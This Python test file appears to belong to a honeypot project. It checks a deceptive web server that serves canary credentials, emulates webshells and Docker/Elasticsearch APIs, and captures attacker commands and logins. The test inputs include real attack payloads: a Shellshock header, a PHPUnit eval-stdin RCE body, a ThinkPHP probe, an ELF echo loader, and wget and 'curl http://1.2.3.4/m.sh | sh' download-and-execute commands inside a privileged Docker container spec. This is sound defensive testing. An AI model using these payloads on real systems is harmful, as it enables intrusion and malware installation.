"""Tests for the HTTP deception site and canary tokens."""

from __future__ import annotations

import json

import pytest

from honeyknot.deception import (
    DeceptionSite,
    canary_token,
    extract_command,
    extract_shellshock,
)
from honeyknot.shell import ShellSession


@pytest.fixture
def site():
    return DeceptionSite({"hostname": "web-01"})


@pytest.fixture
def sh():
    return ShellSession(hostname="web-01", user="www-data")


def _fields(resp, name: str) -> list[dict]:
    return [f for n, f in resp.events if n == name]


class TestCanaryTokens:
    def test_deterministic_for_a_seed(self):
        assert canary_token("aws_key", "a") == canary_token("aws_key", "a")

    def test_different_seeds_differ(self):
        assert canary_token("aws_key", "a") != canary_token("aws_key", "b")

    def test_aws_key_shape(self):
        token = canary_token("aws_key", "web-01")
        assert token.startswith("AKIA")
        assert len(token) == 20
        assert token.isupper() or any(c.isdigit() for c in token)

    def test_aws_secret_shape(self):
        assert len(canary_token("aws_secret", "web-01")) == 40

    def test_password_is_plausible(self):
        pw = canary_token("password", "web-01")
        assert 8 <= len(pw) <= 20
        assert any(c.isdigit() for c in pw)

    def test_unknown_kind_still_returns_something(self):
        assert len(canary_token("nonsense", "x")) == 40


class TestSecretFiles:
    def test_dotenv_serves_canary_credentials(self, site, sh):
        resp = site.respond("GET", "/.env", {}, b"", sh)
        assert resp.status == "200 OK"
        assert b"DB_PASSWORD=" in resp.body
        assert canary_token("aws_key", "web-01").encode() in resp.body
        assert _fields(resp, "secret_served")[0]["artifact"] == "dotenv"

    @pytest.mark.parametrize("path", ["/.env", "/.env.local", "/.env.production"])
    def test_dotenv_variants(self, site, sh, path):
        assert site.respond("GET", path, {}, b"", sh) is not None

    def test_git_config(self, site, sh):
        resp = site.respond("GET", "/.git/config", {}, b"", sh)
        assert b"[remote \"origin\"]" in resp.body
        assert _fields(resp, "secret_served")[0]["artifact"] == "git_config"

    def test_git_head(self, site, sh):
        assert site.respond("GET", "/.git/HEAD", {}, b"", sh).body == \
            b"ref: refs/heads/main\n"

    def test_wp_config_backup(self, site, sh):
        resp = site.respond("GET", "/wp-config.php.bak", {}, b"", sh)
        assert b"DB_PASSWORD" in resp.body
        assert _fields(resp, "secret_served")

    def test_aws_credentials(self, site, sh):
        resp = site.respond("GET", "/.aws/credentials", {}, b"", sh)
        assert b"aws_secret_access_key" in resp.body

    def test_server_status_and_phpinfo(self, site, sh):
        assert b"Apache Server Status" in site.respond(
            "GET", "/server-status", {}, b"", sh).body
        assert b"PHP Version" in site.respond(
            "GET", "/phpinfo.php", {}, b"", sh).body

    def test_actuator_env_leaks_canaries(self, site, sh):
        resp = site.respond("GET", "/actuator/env", {}, b"", sh)
        payload = json.loads(resp.body)
        assert payload["propertySources"][0]["properties"][
            "SPRING_DATASOURCE_PASSWORD"]["value"] == canary_token(
                "password", "web-01:spring")

    def test_actuator_index_lists_endpoints(self, site, sh):
        resp = site.respond("GET", "/actuator", {}, b"", sh)
        assert "heapdump" in json.loads(resp.body)["_links"]

    def test_unmatched_path_falls_through(self, site, sh):
        assert site.respond("GET", "/some/app/page", {}, b"", sh) is None


class TestCommandExtraction:
    @pytest.mark.parametrize("path,expected", [
        ("/shell?cmd=id", "id"),
        ("/x.php?command=uname+-a", "uname -a"),
        ("/x.php?c=whoami", "whoami"),
        ("/index.php?s=/index/think\\app/invokefunction&vars[1][]=cat+/etc/passwd",
         "cat /etc/passwd"),
    ])
    def test_from_query(self, path, expected):
        assert extract_command(path, b"") == expected

    def test_from_form_body(self):
        assert extract_command("/x.php", b"cmd=cat+/proc/cpuinfo") == \
            "cat /proc/cpuinfo"

    def test_from_php_source(self):
        assert extract_command("/eval-stdin.php",
                               b"<?php system('wget http://x/y'); ?>") == \
            "wget http://x/y"

    def test_from_php_echo(self):
        assert extract_command("/x.php", b"<?php echo 'marker123'; ?>") == \
            "echo marker123"

    def test_no_command(self):
        assert extract_command("/index.html", b"") is None

    def test_shellshock_header(self):
        assert extract_shellshock(
            {"user-agent": "() { :; }; /bin/cat /etc/passwd"}) == \
            "/bin/cat /etc/passwd"

    def test_shellshock_ignores_pseudo_headers(self):
        assert extract_shellshock({":path": "() { :; }; id"}) is None

    def test_no_shellshock(self):
        assert extract_shellshock({"user-agent": "curl/7.68.0"}) is None


class TestCommandExecution:
    def test_webshell_cmd_returns_shell_output(self, site, sh):
        resp = site.respond("GET", "/shell?cmd=id", {}, b"", sh)
        assert resp.body.startswith(b"uid=1000(www-data)")
        event = _fields(resp, "web_command")[0]
        assert event["vector"] == "webshell"
        assert event["command"] == "id"

    def test_shellshock_executes_and_labels_the_vector(self, site, sh):
        resp = site.respond(
            "GET", "/cgi-bin/test.sh",
            {"user-agent": "() { :; }; /bin/cat /proc/cpuinfo"}, b"", sh)
        assert b"model name" in resp.body
        assert _fields(resp, "web_command")[0]["vector"] == "shellshock"

    def test_phpunit_eval_stdin(self, site, sh):
        resp = site.respond(
            "POST", "/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php", {},
            b"<?php system('cat /etc/passwd'); ?>", sh)
        assert b"root:x:0:0" in resp.body

    def test_download_command_surfaces_the_url(self, site, sh):
        resp = site.respond("GET", "/shell?cmd=wget+http://1.2.3.4/m", {},
                            b"", sh)
        assert _fields(resp, "download_attempt")[0]["urls"] == \
            ["http://1.2.3.4/m"]

    def test_echo_loader_over_http_yields_an_artifact(self, site, sh):
        body = (b"cmd=" + b"echo+-ne+'" + rb"\x7f\x45\x4c\x46" +
                rb"\x01" * 60 + b"'+>+/tmp/x")
        resp = site.respond("POST", "/up.php", {}, body, sh)
        artifacts = _fields(resp, "_artifact")
        assert artifacts and artifacts[0]["data"][:4] == b"\x7fELF"

    def test_exec_without_a_shell_still_records_the_command(self, site):
        resp = site.respond("GET", "/shell?cmd=id", {}, b"", None)
        assert resp.body == b""
        assert _fields(resp, "web_command")[0]["command"] == "id"

    def test_exec_beats_a_static_route(self, site, sh):
        # `.env?cmd=id` is a command probe, not a file read.
        resp = site.respond("GET", "/.env?cmd=id", {}, b"cmd=id", sh)
        assert _fields(resp, "web_command")


class TestCredentialCapture:
    def test_wp_login_post(self, site, sh):
        resp = site.respond("POST", "/wp-login.php", {},
                            b"log=admin&pwd=hunter2&wp-submit=Log+In", sh)
        creds = _fields(resp, "credentials")[0]
        assert (creds["username"], creds["password"]) == ("admin", "hunter2")
        assert creds["auth"] == "form"
        assert b"password you entered is incorrect" in resp.body

    def test_generic_login_form_is_served_on_get(self, site, sh):
        assert b"<form" in site.respond("GET", "/admin/login", {}, b"", sh).body

    @pytest.mark.parametrize("body,user,password", [
        (b"username=root&password=toor", "root", "toor"),
        (b"j_username=svc&j_password=p4ss", "svc", "p4ss"),
        (b"user=a&pass=b", "a", "b"),
    ])
    def test_form_field_variants(self, site, sh, body, user, password):
        creds = _fields(site.respond("POST", "/login", {}, body, sh),
                        "credentials")[0]
        assert (creds["username"], creds["password"]) == (user, password)

    def test_basic_auth_challenge_then_capture(self, site, sh):
        first = site.respond("GET", "/manager/html", {}, b"", sh)
        assert first.status == "401 Unauthorized"
        assert any("WWW-Authenticate" in h for h in first.extra_headers)

        second = site.respond("GET", "/manager/html",
                              {"authorization": "Basic dG9tY2F0OnMzY3JldA=="},
                              b"", sh)
        creds = _fields(second, "credentials")[0]
        assert (creds["username"], creds["password"]) == ("tomcat", "s3cret")
        # 403 rather than a second 401: pushes the tool to a new account.
        assert second.status == "403 Forbidden"

    def test_malformed_basic_auth_does_not_raise(self, site, sh):
        resp = site.respond("GET", "/manager/html",
                            {"authorization": "Basic !!!not-base64"}, b"", sh)
        assert resp.status == "403 Forbidden"


class TestDockerProfile:
    @pytest.fixture
    def docker(self):
        return DeceptionSite({"profile": "docker", "hostname": "node-3"})

    def test_version(self, docker, sh):
        body = json.loads(docker.respond("GET", "/version", {}, b"", sh).body)
        assert body["ApiVersion"] == "1.41"

    def test_versioned_path_prefix_is_stripped(self, docker, sh):
        assert docker.respond("GET", "/v1.41/info", {}, b"", sh) is not None

    def test_containers_list(self, docker, sh):
        body = json.loads(
            docker.respond("GET", "/containers/json", {}, b"", sh).body)
        assert body[0]["Image"] == "nginx:1.19"

    def test_container_create_captures_the_spec(self, docker, sh):
        spec = json.dumps({
            "Image": "alpine:latest",
            "Cmd": ["/bin/sh", "-c", "curl http://1.2.3.4/m.sh | sh"],
            "HostConfig": {"Binds": ["/:/mnt"], "Privileged": True,
                           "NetworkMode": "host"},
        }).encode()
        resp = docker.respond("POST", "/containers/create", {}, spec, sh)
        assert resp.status == "201 Created"
        event = _fields(resp, "container_create")[0]
        assert event["image"] == "alpine:latest"
        assert event["binds"] == ["/:/mnt"]
        assert event["privileged"] is True
        assert "curl http://1.2.3.4/m.sh | sh" in event["cmd"]

    def test_container_create_with_junk_body(self, docker, sh):
        resp = docker.respond("POST", "/containers/create", {},
                              b"\xff\xfe not json", sh)
        assert _fields(resp, "container_create")[0]["image"] is None

    def test_container_start_and_exec(self, docker, sh):
        assert docker.respond("POST", "/containers/abc123/start", {}, b"",
                              sh).status == "204 No Content"
        resp = docker.respond("POST", "/containers/abc123/exec", {},
                              b'{"Cmd":["id"]}', sh)
        assert _fields(resp, "container_exec")[0]["cmd"] == ["id"]


class TestElasticsearchProfile:
    @pytest.fixture
    def es(self):
        return DeceptionSite({"profile": "elasticsearch", "hostname": "es-1"})

    def test_root_banner(self, es, sh):
        body = json.loads(es.respond("GET", "/", {}, b"", sh).body)
        assert body["tagline"] == "You Know, for Search"
        assert body["version"]["number"] == "6.8.6"

    def test_cluster_health(self, es, sh):
        assert json.loads(
            es.respond("GET", "/_cluster/health", {}, b"", sh).body
        )["status"] == "green"

    def test_cat_indices(self, es, sh):
        assert b"customers" in es.respond("GET", "/_cat/indices?v", {},
                                          b"", sh).body

    def test_es_paths_work_without_the_profile(self, site, sh):
        # A generic site still answers the ES probe paths, since scanners
        # hit them on port 80 too.
        assert site.respond("GET", "/_cluster/health", {}, b"", sh) is not None


class TestDockerScoping:
    """Off-profile, only unambiguously-Docker paths get Docker answers."""

    def test_ambiguous_paths_are_not_answered_generically(self, site, sh):
        # `/version` on a plain web server returning Docker JSON is a tell.
        assert site.respond("GET", "/version", {}, b"", sh) is None
        assert site.respond("GET", "/info", {}, b"", sh) is None

    def test_unambiguous_paths_are_answered_anywhere(self, site, sh):
        # Scanners hammer the Docker API on 80 and 8080 too.
        resp = site.respond("POST", "/containers/create", {},
                            b'{"Image":"alpine"}', sh)
        assert resp is not None
        assert _fields(resp, "container_create")[0]["image"] == "alpine"

    def test_versioned_prefix_is_answered_anywhere(self, site, sh):
        assert site.respond("GET", "/v1.41/version", {}, b"", sh) is not None


class TestRobustness:
    @pytest.mark.parametrize("path", [
        "/", "//", "/%%%", "/../../etc/passwd", "/" + "a" * 5000,
        "/.env\x00.txt", "/?cmd=", "/?" + "&" * 500,
    ])
    def test_pathological_paths_never_raise(self, site, sh, path):
        site.respond("GET", path, {}, b"", sh)

    def test_binary_body_never_raises(self, site, sh):
        site.respond("POST", "/x.php", {}, bytes(range(256)) * 8, sh)

    def test_default_server_header_follows_the_profile(self):
        assert DeceptionSite({"profile": "tomcat"}).server == "Apache-Coyote/1.1"
        assert DeceptionSite({"server": "custom/1.0"}).server == "custom/1.0"
